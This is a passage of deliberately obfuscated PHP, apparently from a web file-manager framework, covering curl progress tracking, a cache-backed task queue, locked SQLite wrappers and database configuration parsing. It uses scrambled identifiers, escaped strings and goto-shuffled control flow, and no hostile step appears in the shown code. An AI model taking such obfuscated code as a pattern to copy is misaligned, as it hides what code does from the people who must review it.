$FµåıÌ‡∞™[$Bπ£ÇƒµçÎ[81]][$Bπ£ÇƒµçÎ[79]] + $FµåıÌ‡∞™[$Bπ£ÇƒµçÎ[81]][$Bπ£ÇƒµçÎ[80]] + 1; } $this->update($f—ò÷ú¬Üã); $this->sourceModelCopyFlag = !1; } public function sourceMove($fØ¶ú´–›¡) { $this->sourceRemove($fØ¶ú´–›¡, !1); } public function curlProgress($BÎ»ŒïÂ≠≈, $F‘è≤çÕØ€, $CäÔ“òÛñÔ, $AÙ¥˘ÁÇıì, $cÏÒñÌ‹ı®) { $AºÓë‡¯°  =& $_SERVER[™⁄»üÆ]; $eÊÿ‚…◊…Ù =& $this->task; if ($cÏÒñÌ‹ı® > 0) { $eÊÿ‚…◊…Ù[$AºÓë‡¯° [1032]] = $AºÓë‡¯° [1602]; $eÊÿ‚…◊…Ù[$AºÓë‡¯° [1585]] = $AºÓë‡¯° [107]; if ($eÊÿ‚…◊…Ù[$AºÓë‡¯° [1583]]) { $eÊÿ‚…◊…Ù[$AºÓë‡¯° [1584]] = $cÏÒñÌ‹ı®; } if ($eÊÿ‚…◊…Ù[$AºÓë‡¯° [1586]]) { $eÊÿ‚…◊…Ù[$AºÓë‡¯° [1584]] = $cÏÒñÌ‹ı® + $eÊÿ‚…◊…Ù[$AºÓë‡¯° [1586]]; } } else { if ($CäÔ“òÛñÔ > 0) { if ($eÊÿ‚…◊…Ù[$AºÓë‡¯° [1583]] == $F‘è≤çÕØ€) { $eÊÿ‚…◊…Ù[$AºÓë‡¯° [1584]] = $CäÔ“òÛñÔ; $eÊÿ‚…◊…Ù[$AºÓë‡¯° [1032]] = $AºÓë‡¯° [1603]; $eÊÿ‚…◊…Ù[$AºÓë‡¯° [1585]] = $AºÓë‡¯° [1102]; } } } $this->update(); } public function curlProgressStart($a¯„ƒóÂ⁄é) { } public function curlProgressEnd($dô¿’óåÌÜ) { goto fÜüâÒËöÛ; fÜüâÒËöÛ: $fºÓ»Íú¯É =& $_SERVER[™⁄»üÆ]; $DÀóäÏ’ﬁ∑ =& $this->task; $eﬁ°“º¥éö = curl_getinfo($dô¿’óåÌÜ); goto aØÈ·’âÌÑ; AæÀö‰®…‚: $this->update(); goto bóœèÕ´øﬁ; aØÈ·’âÌÑ: $Eó””€»ˆ° = $eﬁ°“º¥éö[$fºÓ»Íú¯É[1604]]; if ($Eó””€»ˆ° == -1) { $Eó””€»ˆ° = $eﬁ°“º¥éö[$fºÓ»Íú¯É[1605]]; } if ($DÀóäÏ’ﬁ∑[$fºÓ»Íú¯É[1585]] == $fºÓ»Íú¯É[107] && $Eó””€»ˆ°) { $DÀóäÏ’ﬁ∑[$fºÓ»Íú¯É[1586]] += $Eó””€»ˆ°; } goto AæÀö‰®…‚; bóœèÕ´øﬁ: } } class TaskHttp extends Task { protected function startAfter() { $f…Ò›µæŒÀ =& $_SERVER[™⁄»üÆ]; $D’«‘Ô•π‰ =& $this->task; $D’«‘Ô•π‰[$f…Ò›µæŒÀ[1606]] = 1; Hook::bind($f…Ò›µæŒÀ[1575], array($this, $f…Ò›µæŒÀ[1607])); Hook::bind($f…Ò›µæŒÀ[1577], array($this, $f…Ò›µæŒÀ[1608])); Hook::bind($f…Ò›µæŒÀ[1579], array($this, $f…Ò›µæŒÀ[1609])); } protected function endAfter() { $CΩä™‡Ô∏¢ =& $_SERVER[™⁄»üÆ]; Hook::unbind($CΩä™‡Ô∏¢[1575], array($this, $CΩä™‡Ô∏¢[1607])); Hook::unbind($CΩä™‡Ô∏¢[1577], array($this, $CΩä™‡Ô∏¢[1608])); Hook::unbind($CΩä™‡Ô∏¢[1579], array($this, $CΩä™‡Ô∏¢[1609])); } public function progressStart($fèàÊ≈ø≥∂) { $F∆ÁÏ…ªã˘ =& $_SERVER[™⁄»üÆ]; $a∞ÉŸË¨€® = curl_getinfo($fèàÊ≈ø≥∂); self::log($F∆ÁÏ…ªã˘[1610] . $a∞ÉŸË¨€®[$F∆ÁÏ…ªã˘[305]]); self::valueSet($this->task[$F∆ÁÏ…ªã˘[394]], $this->task); } public function progressEnd($B“Œ⁄»ô”ó) { $f∂„˜ëó∑à =& $_SERVER[™⁄»üÆ]; self::log($f∂„˜ëó∑à[1611] . $this->task[$f∂„˜ëó∑à[394]]); $this->end(); } public function progress($d≥é¥ëﬂùπ, $bÙáü¯÷ΩΩ, $fÖÉˆïä®ç, $F•⁄àûÜ∞¡, $bææ≠ùÓ°€) { $CÜ—ñÍ»™« =& $_SERVER[™⁄»üÆ]; $dıƒ¯üé∏æ =& $this->task; if ($bææ≠ùÓ°€ > 0) { $dıƒ¯üé∏æ[$CÜ—ñÍ»™«[1030]] = $dıƒ¯üé∏æ[$CÜ—ñÍ»™«[1030]] == 0 ? $F•⁄àûÜ∞¡ : $dıƒ¯üé∏æ[$CÜ—ñÍ»™«[1030]]; $dıƒ¯üé∏æ[$CÜ—ñÍ»™«[1044]] = $bææ≠ùÓ°€; } else { if ($fÖÉˆïä®ç > 0) { $dıƒ¯üé∏æ[$CÜ—ñÍ»™«[1030]] = $dıƒ¯üé∏æ[$CÜ—ñÍ»™«[1030]] == 0 ? $bÙáü¯÷ΩΩ : $dıƒ¯üé∏æ[$CÜ—ñÍ»™«[1030]]; $dıƒ¯üé∏æ[$CÜ—ñÍ»™«[1044]] = $fÖÉˆïä®ç; } } $this->update(); self::log("\x70\x72\157\x67\162\145\163\x73\x48\164\x74\160\72\144\x6f\x77\156\72{$fÖÉˆïä®ç}\x2f{$bÙáü¯÷ΩΩ}\73\x20\x75\x70\x6c\x6f\141\144\x3a{$bææ≠ùÓ°€}\57{$F•⁄àûÜ∞¡}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\x73\x6b\121\165\145\x75\145\114\x65\156\147\x74\x68"; const QUEUE_DATA = "\x74\141\x73\x6b\x51\x75\145\x75\x65\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($A¿ﬂê…ü‘•, $a»áÈ§û¿å = array(), $dïŒ˜£˜≈‘ = '', $eÑ±∏äÜ‰ = '') { $cã∏ıª¡†Ω =& $_SERVER[™⁄»üÆ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($eÑ±∏äÜ‰ && array_find_by_field(self::$listData, $cã∏ıª¡†Ω[93], $eÑ±∏äÜ‰)) { return !0; } self::$listData[] = array($cã∏ıª¡†Ω[262] => $A¿ﬂê…ü‘•, $cã∏ıª¡†Ω[1612] => $a»áÈ§û¿å, $cã∏ıª¡†Ω[432] => $dïŒ˜£˜≈‘, $cã∏ıª¡†Ω[93] => $eÑ±∏äÜ‰); return !0; } public static function addSubmit() { $Eöè”ù‘Î =& $_SERVER[™⁄»üÆ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($Eöè”ù‘Î[1613] . json_encode_force(array_to_keyvalue(self::$listData, $Eöè”ù‘Î[33], $Eöè”ù‘Î[432])), $Eöè”ù‘Î[1614]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($C˘–≤Æı±ö, $bïÏÑüÚ·é = array(), $Dì‰≤Ù‘Í© = '', $CõèÙö–«ÿ = '') { goto D¬âÊçÍ¬œ; D¬âÊçÍ¬œ: $E°ﬁ êê◊ =& $_SERVER[™⁄»üÆ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $c±´ µ©˘• = self::getAll(); goto bªóáï™ˆ≈; EÛ‡óΩÕÖ√: self::setAll($c±´ µ©˘•); return !0; goto EØé®ÜàµÜ; bªóáï™ˆ≈: if ($CõèÙö–«ÿ && array_find_by_field($c±´ µ©˘•, $E°ﬁ êê◊[93], $CõèÙö–«ÿ)) { return !0; } $c±´ µ©˘•[] = array($E°ﬁ êê◊[262] => $C˘–≤Æı±ö, $E°ﬁ êê◊[1612] => $bïÏÑüÚ·é, $E°ﬁ êê◊[432] => $Dì‰≤Ù‘Í©, $E°ﬁ êê◊[93] => $CõèÙö–«ÿ); write_log($E°ﬁ êê◊[1613] . $Dì‰≤Ù‘Í©, $E°ﬁ êê◊[1614]); goto EÛ‡óΩÕÖ√; EØé®ÜàµÜ: } public static function run() { goto d“ú∞éÁ£ô; cêçÇ‘ëŸô: if (!$F”è…Ñ≠√¥) { return !1; } self::setAll($AÃ©‘÷⁄ñÊ); $c∂‹∆•ÙÍË = timeFloat(); goto b∞¥Ÿé—Ë–; b∞¥Ÿé—Ë–: try { Hook::apply($F”è…Ñ≠√¥[$C°¿É±¯√·[262]], $F”è…Ñ≠√¥[$C°¿É±¯√·[1612]]); } catch (Exception $a∆Ü“ãÂ´‘) { } $BãíÇÑäâú = number_format(timeFloat() - $c∂‹∆•ÙÍË, 3) . $C°¿É±¯√·[1550]; write_log($C°¿É±¯√·[1615] . $F”è…Ñ≠√¥[$C°¿É±¯√·[432]] . $C°¿É±¯√·[1616] . $BãíÇÑäâú, $C°¿É±¯√·[1614]); goto A∞§ÊîÉàæ; A∞§ÊîÉàæ: return !0; goto Fôüı¢√±∏; d“ú∞éÁ£ô: $C°¿É±¯√· =& $_SERVER[™⁄»üÆ]; $AÃ©‘÷⁄ñÊ = self::getAll(); $F”è…Ñ≠√¥ = array_shift($AÃ©‘÷⁄ñÊ); goto cêçÇ‘ëŸô; Fôüı¢√±∏: } public static function count() { $c–’ÔØ‚â = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$c–’ÔØ‚â) { return 0; } return intval($c–’ÔØ‚â); } public static function getAll() { $C„æﬁáÎ›Ñ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$C„æﬁáÎ›Ñ) { return array(); } return $C„æﬁáÎ›Ñ; } public static function setAll($fú” ìâ´®) { $fˆŸ‘∂ò∏ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($fú” ìâ´®), $fˆŸ‘∂ò∏); Cache::set(self::QUEUE_DATA, $fú” ìâ´®, $fˆŸ‘∂ò∏); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto Aö≤≤®Ÿ›Û; béî⁄çÇË§: class DbSqlite extends DbSqliteBase { public function query($BÃ‡¥πõÙå) { $aÔ√ﬂ¿æäË =& $_SERVER[™⁄»üÆ]; if (!CacheLock::fileLock($aÔ√ﬂ¿æäË[9])) { return !1; } $eªô§ëœ‰ü = parent::query($BÃ‡¥πõÙå); CacheLock::fileUnLock($aÔ√ﬂ¿æäË[9]); return $eªô§ëœ‰ü; } public function execute($BÑ®ÖÇ’◊⁄) { $D›ËŒ¶·Ûµ =& $_SERVER[™⁄»üÆ]; if (!CacheLock::fileLock($D›ËŒ¶·Ûµ[9])) { return !1; } $C»ïì≤™ƒ˜ = parent::execute($BÑ®ÖÇ’◊⁄); CacheLock::fileUnLock($D›ËŒ¶·Ûµ[9]); return $C»ïì≤™ƒ˜; } } class DbSqlite3 extends DbSqlite3Base { public function query($D›ÕÔÉÙÓì) { $E€§å∫æ› =& $_SERVER[™⁄»üÆ]; if (!CacheLock::fileLock($E€§å∫æ›[9])) { return !1; } $bΩüÿ≥ª–é = parent::query($D›ÕÔÉÙÓì); CacheLock::fileUnLock($E€§å∫æ›[9]); return $bΩüÿ≥ª–é; } public function execute($Bäøıƒ·è∞) { $aõ∂˘€Î∆∫ =& $_SERVER[™⁄»üÆ]; if (!CacheLock::fileLock($aõ∂˘€Î∆∫[9])) { return !1; } $b°â≤Ñ”ë’ = parent::execute($Bäøıƒ·è∞); CacheLock::fileUnLock($aõ∂˘€Î∆∫[9]); return $b°â≤Ñ”ë’; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\x71" => "\x3c\76", "\147\x74" => "\76", "\145\x67\164" => "\76\x3d", "\x6c\x74" => "\74", "\x65\154\164" => "\x3c\x3d", "\156\157\164\x6c\151\x6b\x65" => "\116\117\124\40\x4c\111\x4b\x45", "\154\151\x6b\145" => "\x4c\111\x4b\105", "\x69\156" => "\111\x4e", "\156\157\164\x69\156" => "\116\117\124\40\111\x4e", "\156\x6f\x74\40\151\156" => "\x4e\117\124\40\111\116", "\142\x65\x74\167\145\x65\156" => "\x42\105\x54\x57\105\105\x4e", "\x6e\x6f\164\x62\x65\x74\x77\145\x65\x6e" => "\x4e\117\x54\x20\x42\x45\124\127\105\105\x4e", "\x6e\157\164\40\x62\x65\x74\x77\145\x65\156" => "\x4e\117\x54\x20\x42\x45\x54\127\x45\105\116"); protected $selectSql = "\123\x45\x4c\x45\x43\x54\45\104\x49\123\124\111\x4e\x43\124\x25\x20\45\106\111\x45\x4c\x44\x25\40\106\122\117\115\40\x25\x54\x41\102\114\105\x25\x25\112\117\111\116\45\x25\127\x48\105\122\x45\45\x25\107\122\x4f\125\120\x25\45\110\x41\126\x49\x4e\107\45\x25\117\122\x44\x45\x52\45\45\x4c\x49\x4d\x49\124\x25\40\45\125\x4e\111\x4f\x4e\45\45\103\117\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $bÙ„∞Ç£≤¬ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[™⁄»üÆ][929], $bÙ„∞Ç£≤¬); } public function factory($E‹“É◊ÌæÕ = '') { goto bí·”û†Æ’; bí·”û†Æ’: $cÓ‹¿Ô†œÁ =& $_SERVER[™⁄»üÆ]; $E‹“É◊ÌæÕ = $this->parseConfig($E‹“É◊ÌæÕ); if (empty($E‹“É◊ÌæÕ[$cÓ‹¿Ô†œÁ[930]])) { think_exception(think_lang($cÓ‹¿Ô†œÁ[931])); } goto A—è¡ÖÓú€; A—è¡ÖÓú€: $this->dbType = ucwords(strtolower($E‹“É◊ÌæÕ[$cÓ‹¿Ô†œÁ[930]])); $C™ò‰—º∆é = $cÓ‹¿Ô†œÁ[932] . $this->dbType; if (class_exists($C™ò‰—º∆é)) { $CÒ≠ÌñΩ‚ÿ = new $C™ò‰—º∆é($E‹“É◊ÌæÕ); if ($cÓ‹¿Ô†œÁ[774] != strtolower($E‹“É◊ÌæÕ[$cÓ‹¿Ô†œÁ[930]])) { $CÒ≠ÌñΩ‚ÿ->dbType = strtoupper($this->dbType); } else { $CÒ≠ÌñΩ‚ÿ->dbType = $this->_getDsnType($E‹“É◊ÌæÕ[$cÓ‹¿Ô†œÁ[885]]); } } else { think_exception(think_lang($cÓ‹¿Ô†œÁ[933]) . $cÓ‹¿Ô†œÁ[934] . $C™ò‰—º∆é); } goto EÜ„≠àè…¬; EÜ„≠àè…¬: return $CÒ≠ÌñΩ‚ÿ; goto C†¬œø‚æ; C†¬œø‚æ: } public function __call($e®Ÿù≤ÉÚñ, $f◊§∫∫ﬁÕè) { if (method_exists($this, $e®Ÿù≤ÉÚñ)) { return call_user_func_array(array($this, $e®Ÿù≤ÉÚñ), $f◊§∫∫ﬁÕè); } } protected function _getDsnType($CíÜ—À¨Ü”) { $Bæé∆èÈı∫ = explode($_SERVER[™⁄»üÆ][4], $CíÜ—À¨Ü”); $Cƒ¯ÀÉÿûã = strtoupper(trim($Bæé∆èÈı∫[0])); return $Cƒ¯ÀÉÿûã; } private function parseConfig($b·‚»å·ŸŸ = '') { $D⁄™∆ƒœ·Ÿ =& $_SERVER[™⁄»üÆ]; if (!empty($b·‚»å·ŸŸ) && is_string($b·‚»å·ŸŸ)) { $b·‚»å·ŸŸ = $this->parseDSN($b·‚»å·ŸŸ); } elseif (is_array($b·‚»å·ŸŸ)) { $b·‚»å·ŸŸ = array_change_key_case($b·‚»å·ŸŸ); $b·‚»å·ŸŸ = array($D⁄™∆ƒœ·Ÿ[930] => $b·‚»å·ŸŸ[$D⁄™∆ƒœ·Ÿ[773]], $D⁄™∆ƒœ·Ÿ[858] => $b·‚»å·ŸŸ[$D⁄™∆ƒœ·Ÿ[935]], $D⁄™∆ƒœ·Ÿ[859] => $b·‚»å·ŸŸ[$D⁄™∆ƒœ·Ÿ[936]], $D⁄™∆ƒœ·Ÿ[856] => $b·‚»å·ŸŸ[$D⁄™∆ƒœ·Ÿ[937]], $D⁄™∆ƒœ·Ÿ[857] => $b·‚»å·ŸŸ[$D⁄™∆ƒœ·Ÿ[938]], $D⁄™∆ƒœ·Ÿ[17] => $b·‚»å·ŸŸ[$D⁄™∆ƒœ·Ÿ[939]], $D⁄™∆ƒœ·Ÿ[885] => $b·‚»å·ŸŸ[$D⁄™∆ƒœ·Ÿ[775]], $D⁄™∆ƒœ·Ÿ[13] => isset($b·‚»å·ŸŸ[$D⁄™∆ƒœ·Ÿ[940]]) ? $b·‚»å·ŸŸ[$D⁄™∆ƒœ·Ÿ[940]] : array()); } elseif (empty($b·‚»å·ŸŸ)) { if (think_config($D⁄™∆ƒœ·Ÿ[941]) && $D⁄™∆ƒœ·Ÿ[774] != strtolower(think_config($D⁄™∆ƒœ·Ÿ[942]))) { $b·‚»å·ŸŸ = $this->parseDSN(think_config($D⁄™∆ƒœ·Ÿ[941])); } else { $b·‚»å·ŸŸ = array($D⁄™∆ƒœ·Ÿ[930] => think_config($D⁄™∆ƒœ·Ÿ[942]), $D⁄™∆ƒœ·Ÿ[858] => think_config($D⁄™∆ƒœ·Ÿ[943]), $D⁄™∆ƒœ·Ÿ[859] => think_config($D⁄™∆ƒœ·Ÿ[944]), $D⁄™∆ƒœ·Ÿ[856] => think_config($D⁄™∆ƒœ·Ÿ[945]), $D⁄™∆ƒœ·Ÿ[857] => think_config($D⁄™∆ƒœ·Ÿ[946]), $D⁄™∆ƒœ·Ÿ[17] => think_config($D⁄™∆ƒœ·Ÿ[244]), $D⁄™∆ƒœ·Ÿ[885] => think_config($D⁄™∆ƒœ·Ÿ[941]), $D⁄™∆ƒœ·Ÿ[13] => think_config($D⁄™∆ƒœ·Ÿ[947])); } } return $b·‚»å·ŸŸ; } protected function initConnect($eÆÛë≈¯‚∞ = true) { if (1 == think_config($_SERVER[™⁄»üÆ][18])) { $this->_linkID = $this->multiConnect($eÆÛë≈¯‚∞); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $CﬂÏ∫…®›Í => $d±Ï’„Ö¶µ) { $this->_linkID = $d±Ï’„Ö¶µ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($c∂°ØêØå‰ = false) { goto e˘ÿ¯≈∂´Ñ; dÏïŸâæ¨§: $f–´é‘∂í¨ = array($bÆ¥ù˘ÇΩ‘[858] => isset($BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[858]][$C“¢œâÆ‹€]) ? $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[858]][$C“¢œâÆ‹€] : $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[858]][0], $bÆ¥ù˘ÇΩ‘[859] => isset($BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[859]][$C“¢œâÆ‹€]) ? $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[859]][$C“¢œâÆ‹€] : $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[859]][0], $bÆ¥ù˘ÇΩ‘[856] => isset($BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[856]][$C“¢œâÆ‹€]) ? $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[856]][$C“¢œâÆ‹€] : $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[856]][0], $bÆ¥ù˘ÇΩ‘[857] => isset($BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[857]][$C“¢œâÆ‹€]) ? $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[857]][$C“¢œâÆ‹€] : $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[857]][0], $bÆ¥ù˘ÇΩ‘[17] => isset($BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[17]][$C“¢œâÆ‹€]) ? $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[17]][$C“¢œâÆ‹€] : $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[17]][0], $bÆ¥ù˘ÇΩ‘[885] => isset($BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[885]][$C“¢œâÆ‹€]) ? $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[885]][$C“¢œâÆ‹€] : $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[885]][0], $bÆ¥ù˘ÇΩ‘[13] => isset($BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[13]][$C“¢œâÆ‹€]) ? $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[13]][$C“¢œâÆ‹€] : $BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[13]][0]); return $this->connect($f–´é‘∂í¨, $C“¢œâÆ‹€); goto F‹ú°ï‰¯©; e˘ÿ¯≈∂´Ñ: $bÆ¥ù˘ÇΩ‘ =& $_SERVER[™⁄»üÆ]; static $BÎ≥¡ÏØÇó = array(); static $EÔ‰∑ ≈ÙÕ = -1; goto FÆµﬁ´¬•´; FÆµﬁ´¬•´: if (empty($BÎ≥¡ÏØÇó)) { foreach ($this->config as $e—ﬂ‚âÍÑ® => $DÍ˜û˘ú∂´) { $BÎ≥¡ÏØÇó[$e—ﬂ‚âÍÑ®] = explode($bÆ¥ù˘ÇΩ‘[47], $DÍ˜û˘ú∂´); } } if (think_config($bÆ¥ù˘ÇΩ‘[948])) { if ($c∂°ØêØå‰ || think_config($bÆ¥ù˘ÇΩ‘[390]) === !0) { $C“¢œâÆ‹€ = floor(mt_rand(0, think_config($bÆ¥ù˘ÇΩ‘[949]) - 1)); $EÔ‰∑ ≈ÙÕ = $C“¢œâÆ‹€; } else { if (is_numeric(think_config($bÆ¥ù˘ÇΩ‘[950]))) { $C“¢œâÆ‹€ = think_config($bÆ¥ù˘ÇΩ‘[950]); } else { $C“¢œâÆ‹€ = floor(mt_rand(think_config($bÆ¥ù˘ÇΩ‘[949]), count($BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[856]]) - 1)); } } } else { $C“¢œâÆ‹€ = floor(mt_rand(0, count($BÎ≥¡ÏØÇó[$bÆ¥ù˘ÇΩ‘[856]]) - 1)); $EÔ‰∑ ≈ÙÕ = $C“¢œâÆ‹€; } $C“¢œâÆ‹€ = $EÔ‰∑ ≈ÙÕ !== -1 ? $EÔ‰∑ ≈ÙÕ : $C“¢œâÆ‹€; goto dÏïŸâæ¨§; F‹ú°ï‰¯©: } public function parseDSN($fêå°ã¨˜ú) { $c—ôﬁÉ⁄®ê =& $_SERVER[™⁄»üÆ]; if (empty($fêå°ã¨˜ú)) { return !1; } $fü„¿»“æî = parse_url($fêå°ã¨˜ú); if ($fü„¿»“æî[$c—ôﬁÉ⁄®ê[174]]) { $E´Ë„ó¿·® = array($c—ôﬁÉ⁄®ê[930] => $fü„¿»“æî[$c—ôﬁÉ⁄®ê[174]], $c—ôﬁÉ⁄®ê[858] => isset($fü„¿»“æî[$c—ôﬁÉ⁄®ê[576]]) ? $fü„¿»“æî[$c—ôﬁÉ⁄®ê[576]] : $c—ôﬁÉ⁄®ê[33], $c—ôﬁÉ⁄®ê[859] => isset($fü„¿»“æî[$c—ôﬁÉ⁄®ê[951]]) ? $fü„¿»“æî[$c—ôﬁÉ⁄®ê[951]] : $c—ôﬁÉ⁄®ê[33], $c—ôﬁÉ⁄®ê[856] => isset($fü„¿»“æî[$c—ôﬁÉ⁄®ê[175]]) ? $fü„¿»“æî[$c—ôﬁÉ⁄®ê[175]] : $c—ôﬁÉ⁄®ê[33], $c—ôﬁÉ⁄®ê[857] => isset($fü„¿»“æî[$c—ôﬁÉ⁄®ê[176]]) ? $fü„¿»“æî[$c—ôﬁÉ⁄®ê[176]] : $c—ôﬁÉ⁄®ê[33], $c—ôﬁÉ⁄®ê[17] => isset($fü„¿»“æî[$c—ôﬁÉ⁄®ê[76]]) ? substr($fü„¿»“æî[$c—ôﬁÉ⁄®ê[76]], 1) : $c—ôﬁÉ⁄®ê[33]); } else { preg_match($c—ôﬁÉ⁄®ê[952], trim($fêå°ã¨˜ú), $bÒçúã˘áÃ); $E´Ë„ó¿·® = array($c—ôﬁÉ⁄®ê[930] => $bÒçúã˘áÃ[1], $c—ôﬁÉ⁄®ê[858] => $bÒçúã˘áÃ[2], $c—ôﬁÉ⁄®ê[859] => $bÒçúã˘áÃ[3], $c—ôﬁÉ⁄®ê[856] => $bÒçúã˘áÃ[4], $c—ôﬁÉ⁄®ê[857] => $bÒçúã˘áÃ[5], $c—ôﬁÉ⁄®ê[17] => $bÒçúã˘áÃ[6]); } $E´Ë„ó¿·®[$c—ôﬁÉ⁄®ê[885]] = $c—ôﬁÉ⁄®ê[33]; return $E´Ë„ó¿·®; } protected function debug() { $BÿˆåÜ¿‰Ü =& $_SERVER[™⁄»üÆ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $BÿˆåÜ¿‰Ü[953]; if (think_config($BÿˆåÜ¿‰Ü[954])) { think_status($BÿˆåÜ¿‰Ü[955]); think_trace($this->queryStr . $BÿˆåÜ¿‰Ü[956] . think_status($BÿˆåÜ¿‰Ü[20], $BÿˆåÜ¿‰Ü[955], 6) . $BÿˆåÜ¿‰Ü[957], $BÿˆåÜ¿‰Ü[33], $BÿˆåÜ¿‰Ü[958]); } } protected function parseLock($CøÒ‚‰å˜É = false) { $DòÃ¡â⁄€¡ =& $_SERVER[™⁄»üÆ]; if (!$CøÒ‚‰å˜É) { return $DòÃ¡â⁄€¡[33]; } if ($DòÃ¡â⁄€¡[887] == $this->dbType) { return $DòÃ¡â⁄€¡[959]; } return $DòÃ¡â⁄€¡[960]; } protected function parseSet($b∆‡€ÜõãÓ) { $cŸ÷Ó†Â≤Ç =& $_SERVER[™⁄»üÆ]; foreach ($b∆‡€ÜõãÓ as $D– ”‘©∑è => $bÕ”¢‡º‡º) { if (is_array($bÕ”¢‡º‡º) && $cŸ÷Ó†Â≤Ç[295] == $bÕ”¢‡º‡º[0]) { $AÉ ·ò–¢ù[] = $this->parseKey($D– ”‘©∑è) . $cŸ÷Ó†Â≤Ç[961] . $bÕ”¢‡º‡º[1]; } elseif (is_scalar($bÕ”¢‡º‡º) || is_null($bÕ”¢‡º‡º)) { $AÉ ·ò–¢ù[] = $this->parseKey($D– ”‘©∑è) . $cŸ÷Ó†Â≤Ç[961] . $this->parseValue($bÕ”¢‡º‡º); } } return $cŸ÷Ó†Â≤Ç[962] . implode($cŸ÷Ó†Â≤Ç[47], $AÉ ·ò–¢ù); } protected function bindParam($a¨ŒæÿÛ£ë, $dé¥⁄„’“Î) { $this->bind[$_SERVER[™⁄»üÆ][4] . $a¨ŒæÿÛ£ë] = $dé¥⁄„’“Î; } protected function parseBind($bÆâÏµÿ¡â) { $bÆâÏµÿ¡â = array_merge($this->bind, $bÆâÏµÿ¡â); $this->bind = array(); return $bÆâÏµÿ¡â; } function parseKey(&$dˆ˘ÿ¿è∫ˆ, $c Ú®Üªåπ = true) { if ($c Ú®Üªåπ) { $dˆ˘ÿ¿è∫ˆ = $this->parseKeyCheck($dˆ˘ÿ¿è∫ˆ); } return $dˆ˘ÿ¿è∫ˆ; } function parseKeyCheck($F°–≠Õ∑∑ï) { $fõ‹ã∑¿€¯ =& $_SERVER[™⁄»üÆ]; $F°–≠Õ∑∑ï = trim($F°–≠Õ∑∑ï); if (!preg_match($fõ‹ã∑¿€¯[963], $F°–≠Õ∑∑ï)) { think_exception($fõ‹ã∑¿€¯[964] . $F°–≠Õ∑∑ï); } return $F°–≠Õ∑∑ï; } protected function parseValue($d±ã ”ï·ø) { $aà±ÇìÎ©œ =& $_SERVER[™⁄»üÆ]; if (is_string($d±ã ”ï·ø)) { $d±ã ”ï·ø = $aà±ÇìÎ©œ[926] . $this->escapeString($d±ã ”ï·ø) . $aà±ÇìÎ©œ[926]; } elseif (isset($d±ã ”ï·ø[0]) && is_string($d±ã ”ï·ø[0]) && strtolower($d±ã ”ï·ø[0]) == $aà±ÇìÎ©œ[295]) { $d±ã ”ï·ø = $this->escapeString($d±ã ”ï·ø[1]); } elseif (is_array($d±ã ”ï·ø)) { $d±ã ”ï·ø = array_map(array($this, $aà±ÇìÎ©œ[927]), $d±ã ”ï·ø); } elseif (is_bool($d±ã ”ï·ø)) { $d±ã ”ï·ø = $d±ã ”ï·ø ? $aà±ÇìÎ©œ[87] : $aà±ÇìÎ©œ[191]; } elseif (is_null($d±ã ”ï·ø)) { $d±ã ”ï·ø = $aà±ÇìÎ©œ[103]; } return $d±ã ”ï·ø; } protected function parseField($cÚ∆¿¢ÇãÔ) { $d°È…ëÎ¢ä =& $_SERVER[™⁄»üÆ]; if (is_string($cÚ∆¿¢ÇãÔ) && strpos($cÚ∆¿¢ÇãÔ, $d°È…ëÎ¢ä[47])) { $cÚ∆¿¢ÇãÔ = explode($d°È…ëÎ¢ä[47], $cÚ∆¿¢ÇãÔ); } if (is_array($cÚ∆¿¢ÇãÔ)) { $Bﬁ†ò¬å‚’ = array(); foreach 